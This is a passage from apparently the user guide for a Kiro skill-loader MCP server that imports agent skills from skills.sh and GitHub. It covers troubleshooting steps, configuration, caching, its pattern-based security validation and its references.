   - `pdf_extractor` → `pdf-extractor` (use hyphens)
   - `pdfExtractor` → `pdf-extractor` (use lowercase)

4. **Use owner/repo format**:
   ```
   Import anthropics/pdf-extractor as a power
   ```
   More specific than just the skill name.

5. **Check skills.sh directly**:
   Visit [skills.sh](https://skills.sh) to verify the skill exists.

**Prevention**:
- Always search before importing
- Copy skill names exactly from search results
- Use owner/repo format for clarity

---

### Issue: Network Errors

**Problem**: Network requests fail during fetch or import.

**Symptoms**:
```
Error: Network request failed
Error: Timeout fetching skill
Error: ECONNREFUSED
Error: getaddrinfo ENOTFOUND
```

**Causes**:
- No internet connection
- GitHub is down
- Firewall blocking requests
- Proxy configuration issues
- Rate limiting

**Solutions**:

1. **Check internet connection**:
   ```bash
   ping github.com
   curl https://raw.githubusercontent.com
   ```

2. **Check GitHub status**:
   Visit [githubstatus.com](https://www.githubstatus.com)

3. **Wait and retry**:
   Network issues are often temporary. Wait 30 seconds and try again.

4. **Check firewall settings**:
   Ensure your firewall allows:
   - github.com
   - raw.githubusercontent.com
   - registry.npmjs.org

5. **Configure proxy** (if behind corporate firewall):
   ```bash
   npm config set proxy http://proxy.company.com:8080
   npm config set https-proxy http://proxy.company.com:8080
   ```

6. **Check rate limiting**:
   GitHub limits unauthenticated requests. If you're hitting limits, wait an hour or authenticate.

**Prevention**:
- Ensure stable internet connection
- Cache frequently used skills
- Use authenticated GitHub requests for higher limits

---

### Issue: Security Validation Failures

**Problem**: Skills fail security validation and won't import.

**Symptoms**:
```
Security validation: UNSAFE
Error: Import blocked due to security issues
Warning: Dangerous command detected
```

**Causes**:
- Skill contains dangerous commands
- Skill accesses sensitive files
- Skill has code injection patterns
- Skill from untrusted source

**Solutions**:

1. **Review the security issues**:
   ```
   Validate [skill-name]
   ```
   See exactly what was flagged.

2. **Inspect the skill content**:
   ```
   Fetch [skill-name]
   ```
   Review the code manually.

3. **Decide if it's a false positive**:
   Some legitimate skills trigger warnings. Examples:
   - Build scripts that clean directories
   - Configuration tools that modify dotfiles
   - Development tools that use eval

4. **Skip validation** (only if you trust the skill):
   ```
   Import [skill-name] with skipValidation: true
   ```
   **Warning**: Only do this if you've reviewed the code!

5. **Report false positives**:
   If a legitimate skill is blocked, report it to improve validation.

6. **Find an alternative**:
   Search for similar skills that pass validation.

**Prevention**:
- Only import skills from trusted sources
- Always review validation results
- Check install counts (popular = more likely safe)
- Prefer official repositories (anthropics, vercel-labs)

---

### Issue: Parsing Errors

**Problem**: Skill content can't be parsed.

**Symptoms**:
```
Error: Invalid YAML frontmatter
Error: Failed to parse skill content
Error: Missing required field: name
```

**Causes**:
- Malformed YAML frontmatter
- Missing required fields
- Invalid markdown structure
- Encoding issues

**Solutions**:

1. **Fetch and inspect the skill**:
   ```
   Fetch [skill-name]
   ```
   Look for obvious formatting issues.

2. **Check YAML syntax**:
   Frontmatter must be valid YAML:
   ```yaml
   ---
   name: Skill Name
   description: Description here
   ---
   ```

3. **Verify required fields**:
   Skills must have at least:
   - `name`: Skill name
   - `description`: Brief description

4. **Check for encoding issues**:
   Ensure the skill uses UTF-8 encoding.

5. **Report the issue**:
   If the skill is from skills.sh, report the parsing error.

6. **Try a different skill**:
   Find an alternative that's properly formatted.

**Prevention**:
- Prefer skills from official repositories
- Check install counts (popular skills are usually well-formatted)
- Validate before importing

---

### Issue: File Permission Errors

**Problem**: Can't write imported skills to disk.

**Symptoms**:
```
Error: EACCES: permission denied
Error: Cannot write to ~/.kiro/powers/
Error: Directory not writable
```

**Causes**:
- Insufficient file permissions
- Directory doesn't exist
- Disk full
- File system read-only

**Solutions**:

1. **Check directory permissions**:
   ```bash
   ls -la ~/.kiro/
   ls -la .kiro/
   ```

2. **Create missing directories**:
   ```bash
   mkdir -p ~/.kiro/powers
   mkdir -p .kiro/steering
   ```

3. **Fix permissions**:
   ```bash
   chmod 755 ~/.kiro/powers
   chmod 755 .kiro/steering
   ```

4. **Check disk space**:
   ```bash
   df -h
   ```
   Ensure you have free space.

5. **Check if file system is read-only**:
   ```bash
   mount | grep "read-only"
   ```

**Prevention**:
- Ensure proper directory setup
- Maintain adequate disk space
- Regular permission checks

---

### Issue: Import Succeeds But Skill Doesn't Work

**Problem**: Skill imports successfully but doesn't function as expected.

**Symptoms**:
- Skill imported but Kiro doesn't use it
- Skill content seems incomplete
- Skill references missing dependencies

**Causes**:
- Skill requires external tools not installed
- Skill has dependencies on other skills
- Skill format incompatible with Kiro
- Skill needs configuration

**Solutions**:

1. **Read the skill documentation**:
   ```
   Fetch [skill-name]
   ```
   Look for prerequisites or setup instructions.

2. **Check for required tools**:
   Some skills need external tools:
   - PDF skills may need `pdftotext`
   - Image skills may need `imagemagick`
   - API skills may need `curl` or `httpie`

3. **Install dependencies**:
   Follow the skill's installation instructions.

4. **Try the skill explicitly**:
   ```
   Use [skill-name] to [task]
   ```
   Explicitly reference the skill.

5. **Check skill format**:
   Ensure the skill follows the Agent Skills standard.

6. **Report compatibility issues**:
   If a skill doesn't work with Kiro, report it.

**Prevention**:
- Read skill documentation before importing
- Check prerequisites
- Test skills after importing

---

### Debugging Commands

**Check MCP server status**:
```
List available MCP servers
Show skill-loader server status
```

**Test basic functionality**:
```
List the top 5 skills
```

**Verify installation**:
```
Show me my imported skills
List my powers
List my steering files
```

**Check specific skill**:
```
Fetch [skill-name]
Validate [skill-name]
```

**Get detailed error information**:
```
Show me the last error
What went wrong with the import?
```

---

### Getting Help

If you're still having issues:

1. **Check the MCP server logs**:
   Look for error messages in Kiro's MCP server logs.

2. **Visit the GitHub repository**:
   [github.com/kiro/skill-loader-mcp-server](https://github.com/kiro/skill-loader-mcp-server)

3. **Search existing issues**:
   Someone may have encountered the same problem.

4. **Open a new issue**:
   Provide:
   - Error message
   - Steps to reproduce
   - Node.js version
   - Operating system
   - Skill name (if applicable)

5. **Ask in the community**:
   Join the Kiro community for help from other users.


## Technical Details

### Architecture

The Skill Loader Power follows the **Guided MCP Power** pattern:

```
┌─────────────────────────────────────────┐
│         Skill Loader Power              │
│  (Documentation Only - This File)       │
│                                         │
│  • POWER.md - User guide                │
│  • mcp.json - Server configuration      │
│  • steering/ - Optional guides          │
└─────────────────────────────────────────┘
                    │
                    │ Configures
                    ▼
┌─────────────────────────────────────────┐
│    Skill Loader MCP Server              │
│  (@kiro/skill-loader-mcp-server)        │
│                                         │
│  • Provides 9 MCP tools                 │
│  • Handles skill operations             │
│  • Implements security validation       │
└─────────────────────────────────────────┘
                    │
                    │ Fetches from
                    ▼
┌─────────────────────────────────────────┐
│         External Sources                │
│                                         │
│  • skills.sh - Skill directory          │
│  • GitHub - Skill repositories          │
└─────────────────────────────────────────┘
```

**Key Points**:
- The power is **documentation only** - no executable code
- The MCP server provides all functionality
- The server is automatically installed via npx
- Communication uses the MCP (Model Context Protocol)

### MCP Server Details

**Package Information**:
- **Name**: `@kiro/skill-loader-mcp-server`
- **Version**: 1.0.0
- **Repository**: [github.com/kiro/skill-loader-mcp-server](https://github.com/kiro/skill-loader-mcp-server)
- **Protocol**: MCP (Model Context Protocol)
- **Transport**: stdio (standard input/output)
- **Node.js**: Requires 18.0.0 or higher

**Runtime Dependencies**:
- `@modelcontextprotocol/sdk` - MCP protocol implementation
- `js-yaml` - YAML parsing for skill frontmatter
- `marked` - Markdown parsing
- `node-fetch` - HTTP requests to GitHub

### Tools Summary

| Tool | Purpose | Category | Input | Output |
|------|---------|----------|-------|--------|
| list_skills | List all skills | Discovery | page, pageSize | Paginated skill list |
| search_skills | Search by keyword | Discovery | query, limit | Matching skills |
| get_leaderboard | Top/trending skills | Discovery | timeframe, limit | Ranked skills |
| fetch_skill | Download skill | Fetching | identifier | Skill content + metadata |
| validate_skill | Security check | Fetching | content, url | Validation result |
| convert_to_steering | Make steering file | Conversion | content, sourceUrl | Steering file content |
| convert_to_power | Make power | Conversion | content, sourceUrl | Power content |
| import_skill | Complete workflow | Workflow | identifier, format | Imported skill |

### File Locations

| Type | Location | Purpose | Persistence |
|------|----------|---------|-------------|
| Steering Files | `.kiro/steering/{skill-name}.md` | Temporary context for tasks | Session-based |
| Powers | `~/.kiro/powers/{skill-name}/POWER.md` | Permanent integration | Persistent |
| MCP Config | `mcp.json` | Server configuration | Persistent |
| Cache | In-memory | Skills.sh directory cache | 1 hour TTL |

**Steering Files**:
- Located in project-specific `.kiro/steering/` directory
- Provide temporary context for specific tasks
- Can be version controlled with your project
- Automatically available when in the project directory

**Powers**:
- Located in user's home directory `~/.kiro/powers/`
- Available globally across all projects
- Persist across sessions
- Require manual removal to delete

### Configuration Options

The `mcp.json` file supports these options:

```json
{
  "mcpServers": {
    "skill-loader": {
      "command": "npx",
      "args": ["-y", "@kiro/skill-loader-mcp-server"],
      "description": "Skill Loader MCP Server",
      "disabled": false,
      "autoApprove": []
    }
  }
}
```

**Configuration Fields**:

- **command**: Executable to run (`npx` for auto-install, or `skill-loader-mcp-server` if globally installed)
- **args**: Command arguments (`-y` auto-accepts npm installation)
- **description**: Human-readable description
- **disabled**: Set to `true` to disable the server
- **autoApprove**: Array of tool names to auto-approve (empty = approve each call)

**Alternative Configurations**:

**Global Installation**:
```json
{
  "command": "skill-loader-mcp-server",
  "args": []
}
```

**With Auto-Approve** (not recommended for security):
```json
{
  "autoApprove": ["list_skills", "search_skills", "get_leaderboard"]
}
```

**Disabled**:
```json
{
  "disabled": true
}
```

### Performance Characteristics

**Caching**:
- Skills.sh directory cached in memory for 1 hour
- First request: 5-10 seconds (fetches and caches directory)
- Subsequent requests: < 1 second (uses cache)
- Cache automatically refreshes after 1 hour

**Network Requests**:
- Retry logic: Up to 3 attempts with exponential backoff
- Timeout: 30 seconds per request
- Concurrent requests: Supported (independent operations)
- Rate limiting: Subject to GitHub's rate limits (60 requests/hour unauthenticated)

**Typical Response Times**:
- `list_skills`: < 1 second (cached)
- `search_skills`: < 1 second (cached)
- `get_leaderboard`: < 1 second (cached)
- `fetch_skill`: 2-5 seconds (GitHub fetch)
- `validate_skill`: < 1 second (local scan)
- `convert_to_steering`: < 1 second (local conversion)
- `convert_to_power`: < 1 second (local conversion)
- `import_skill`: 3-7 seconds (fetch + validate + convert)

**Resource Usage**:
- Memory: ~50 MB (includes cached directory)
- CPU: Minimal (I/O bound operations)
- Disk: ~200 KB (package size)
- Network: ~100 KB per skill fetch

### Security Model

**Validation Approach**:
- **Pattern-based scanning**: Searches for known dangerous patterns
- **Source verification**: Checks if skill is from trusted GitHub repositories
- **Severity classification**: Assigns safe/warning/unsafe levels
- **Blocking behavior**: Unsafe skills blocked by default

**What's Validated**:
- ✓ Skill content (markdown + YAML)
- ✓ Commands and code snippets
- ✓ File paths and operations
- ✓ Source URL

**What's NOT Validated**:
- ✗ External dependencies
- ✗ Runtime behavior
- ✗ Network requests made by the skill
- ✗ Sophisticated obfuscation

**Trust Model**:
- **Trusted sources**: github.com, raw.githubusercontent.com
- **Untrusted sources**: Other domains, localhost, IP addresses
- **Community trust**: Install count as proxy for safety

### Data Flow

**Import Workflow**:
```
1. User: "Import pdf-extractor as a steering file"
   ↓
2. Kiro → MCP Server: import_skill(identifier, format)
   ↓
3. MCP Server → skills.sh: Resolve identifier
   ↓
4. MCP Server → GitHub: Fetch skill content
   ↓
5. MCP Server: Validate security
   ↓
6. MCP Server: Convert to format
   ↓
7. MCP Server → Kiro: Return converted content
   ↓
8. Kiro: Write to file system
   ↓
9. Kiro → User: "✓ Imported successfully"
```

**Search Workflow**:
```
1. User: "Search for PDF skills"
   ↓
2. Kiro → MCP Server: search_skills(query)
   ↓
3. MCP Server: Check cache
   ↓
4. If cache miss:
   MCP Server → skills.sh: Fetch directory
   MCP Server: Cache for 1 hour
   ↓
5. MCP Server: Filter by query
   ↓
6. MCP Server: Sort by relevance
   ↓
7. MCP Server → Kiro: Return results
   ↓
8. Kiro → User: Display results
```

### Error Handling

All tools return errors in a consistent format:

```json
{
  "error": "Error message",
  "tool": "tool_name",
  "timestamp": "2024-01-15T10:30:00.000Z",
  "details": {
    "cause": "Specific cause",
    "suggestion": "How to fix"
  }
}
```

**Error Categories**:
- **Network errors**: Connection issues, timeouts, HTTP errors
- **Validation errors**: Security issues, format problems
- **Parsing errors**: YAML syntax, invalid markdown
- **Resolution errors**: Skill not found, ambiguous identifiers
- **File system errors**: Permission denied, disk full

### Extending the Power

**Adding Custom Steering Files**:

Create additional guides in the `steering/` directory:

```markdown
---
inclusion: manual
---

# My Custom Guide

[Your content here]
```

**Creating Skill Collections**:

Document common skill combinations for specific workflows:

```markdown
# Web Development Skills

For web development, import these skills:
- react-component-builder
- api-tester
- css-helper
```

**Customizing MCP Configuration**:

Adjust `mcp.json` for your needs:
- Change auto-approve settings
- Add environment variables
- Configure logging

### Limitations

**Current Limitations**:
- No persistent caching (in-memory only, resets on restart)
- No batch operations (import one skill at a time)
- No custom repositories (skills.sh and GitHub only)
- No skill versioning (always fetches latest)
- No offline mode (requires internet connection)
- No skill updates (must re-import to update)

**GitHub Rate Limits**:
- Unauthenticated: 60 requests/hour
- Authenticated: 5,000 requests/hour
- Skills.sh caching helps reduce requests

**Skill Format Requirements**:
- Must have YAML frontmatter
- Must have `name` field
- Must be valid markdown
- Must be in Agent Skills format

### Future Enhancements

Potential future features:
- Persistent caching to disk
- Batch import operations
- Custom repository support
- Skill versioning and updates
- Offline mode with local cache
- Skill dependency management
- Analytics and usage tracking
- Webhook notifications for skill updates


## References

### Official Resources

- **[Skill Loader MCP Server](https://github.com/kiro/skill-loader-mcp-server)** - MCP server repository with source code and documentation
- **[skills.sh Directory](https://skills.sh)** - Official Claude skills marketplace and directory
- **[Agent Skills Standard](https://agentskills.io)** - Specification for the Agent Skills format
- **[Model Context Protocol](https://spec.modelcontextprotocol.io/)** - MCP protocol specification

### Skill Repositories

Popular repositories containing Claude skills:

- **[Anthropic Skills](https://github.com/anthropics/skills)** - Official skills from Anthropic
  - pdf-extractor, web-scraper, api-tester, and more
  - High quality, well-maintained
  - Most popular skills on skills.sh

- **[Vercel Agent Skills](https://github.com/vercel-labs/agent-skills)** - Skills from Vercel Labs
  - React, Next.js, and web development skills
  - Modern web development focus
  - Active development

- **[Better Auth Skills](https://github.com/better-auth/skills)** - Authentication and security skills
  - OAuth, JWT, authentication patterns
  - Security-focused
  - Best practices for auth

### Kiro Documentation

- **[Kiro Powers Guide](https://docs.kiro.dev/powers)** - Complete guide to Kiro powers
- **[Kiro Steering Files](https://docs.kiro.dev/steering)** - How to use steering files
- **[Kiro MCP Integration](https://docs.kiro.dev/mcp)** - MCP server integration guide
- **[Kiro CLI Reference](https://docs.kiro.dev/cli)** - Command-line interface documentation

### Related Tools

- **[Claude Desktop](https://claude.ai/desktop)** - Claude's desktop app with MCP support
- **[MCP Inspector](https://github.com/modelcontextprotocol/inspector)** - Tool for testing MCP servers
- **[Agent Skills CLI](https://github.com/agentskills/cli)** - Command-line tool for managing skills

### Community

- **[Kiro Community Forum](https://community.kiro.dev)** - Ask questions and share tips
- **[Kiro Discord](https://discord.gg/kiro)** - Real-time chat with other users
- **[Kiro GitHub Discussions](https://github.com/kiro/kiro/discussions)** - Feature requests and discussions

### Learning Resources

- **[Agent Skills Tutorial](https://agentskills.io/tutorial)** - Learn to create your own skills
- **[MCP Getting Started](https://spec.modelcontextprotocol.io/getting-started)** - Introduction to MCP
- **[Kiro Power Development](https://docs.kiro.dev/power-development)** - Create your own powers

### Contributing

Want to contribute?

- **Report bugs**: [GitHub Issues](https://github.com/kiro/skill-loader-mcp-server/issues)
- **Suggest features**: [GitHub Discussions](https://github.com/kiro/skill-loader-mcp-server/discussions)
- **Submit skills**: [skills.sh Submission](https://skills.sh/submit)
- **Improve docs**: [Documentation Repo](https://github.com/kiro/docs)

### Version History

- **v2.0.0** (Current) - Documentation-only power with MCP server
- **v1.0.0** - Original implementation (deprecated)

### License

This power and the MCP server are released under the MIT License.

---

**Need Help?**

- Check the [Troubleshooting](#troubleshooting) section
- Visit the [GitHub repository](https://github.com/kiro/skill-loader-mcp-server)
- Ask in the [Kiro community](https://community.kiro.dev)
- Open an [issue](https://github.com/kiro/skill-loader-mcp-server/issues)

**Happy skill loading! 🚀**

